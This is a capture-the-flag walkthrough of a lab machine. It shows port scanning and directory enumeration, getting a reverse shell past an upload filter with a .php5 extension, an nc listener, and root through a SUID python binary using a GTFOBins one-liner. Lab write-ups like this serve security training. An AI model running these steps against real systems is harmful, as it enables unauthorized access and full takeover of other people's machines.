Let's start with rustscan to quickly find open ports,

```bash
rustscan -a 10.10.241.86
```

Now, that we got 2 open ports, let's run a detailed nmap port scan,

```bash
nmap -sC -sV -p22,80 10.10.241.86
```

Nmap reveals that port 22 is running ssh service and port 80 is running apache webserver. Let's start enumerating port 80.

Visit http://10.10.241.86,

and we're presented with landing page. But this page doesn't reveal information which will be useful to us. Let's enumerate directories using dirsearch,

```bash
dirsearch -u http://10.10.241.86 -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301
```

we got few directories. But /panel path seems fascinating to me, let's find out.

Visit http://10.10.241.86/panel,

Ahh, we're presented with an upload page. Seems like we can upload .php extensions file here. 

Let's try to upload a reverse shell (.php ext),

![image](https://user-images.githubusercontent.com/67465230/186825057-83a1e2f4-221d-4076-bf49-db603badd75e.png)

after uploading, we got error,

![image](https://user-images.githubusercontent.com/67465230/186825113-18dd3ab8-417b-494a-a3ac-8d9847eb98a7.png)

Seems like website is filtering .php file extension. Let's try another extension (.php5)

after clicking on upload, 

![image](https://user-images.githubusercontent.com/67465230/186825146-cf074e65-f55a-40e7-a3bb-5a75fc579f23.png)

Seems like our reverse shell gets uploaded successfully. 

Let's start listener using `nc -nvlp 4444` and visit http://10.10.241.86/uploads,

![image](https://user-images.githubusercontent.com/67465230/186825178-c84dbe59-650f-4977-8d97-49f7bfd9ee57.png)

and we can see our uploaded shell here. Let's click on it to execute our shell.

and there we go, we've our connection back on our listener,

![image](https://user-images.githubusercontent.com/67465230/186825200-645f1cd7-a494-4569-b9ee-3be94c162fad.png)

Issuing `id` command will show us that we're **www-data** user.

Let's first convert this improper shell to terminal,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'`
```

![image](https://user-images.githubusercontent.com/67465230/186825235-d297515d-2764-409c-9643-ae4c855a56f3.png)

now we got a terminal. Let's look for user flag.

Let's search for user flag in whole system,

```bash
find / -name *user*.txt -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/186825275-d556934d-f2d4-41d0-9979-7cc04113dd58.png)

Executing this command will return us files which has "user.txt" name associated with it. And, we found that our user flag is in /var/www directory and not in /home directory.

Let's navigate to **/var/www** and establish directory content using `ls -la`,

![image](https://user-images.githubusercontent.com/67465230/186825317-7bc6e3bd-fa54-44fd-acbb-0e9f8e26c2be.png)

there we have our user flag. 

For privilege escalation, we'll find those binaries which has SUID bit set on them,

```bash
find / -perm -04000 -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/186825353-6094a1af-c249-4f72-98d4-b1c618a853bf.png)

we got some binaries, but **/usr/bin/python** binary is unusually interesting. 

Let's visit https://gtfobins.github.io and search for python,

![image](https://user-images.githubusercontent.com/67465230/186825378-d9fa4aac-c4ee-4be0-b24d-908a53bcbf15.png)

and we'll end up get a method to escalate our privilege by abusing SUID bit on python. Let's execute our command,

```bash
/usr/bin/python -c 'import os; os.execl("/bin/bash", "sh", "-p")'
```

![image](https://user-images.githubusercontent.com/67465230/186825408-9040bf77-dcc0-4ca7-8f01-2b05a517a1cf.png)

after executing this command, we'll get basic bash prompt indicating that we've now system access. And we can confirm that we're root user by issuing `id` command.
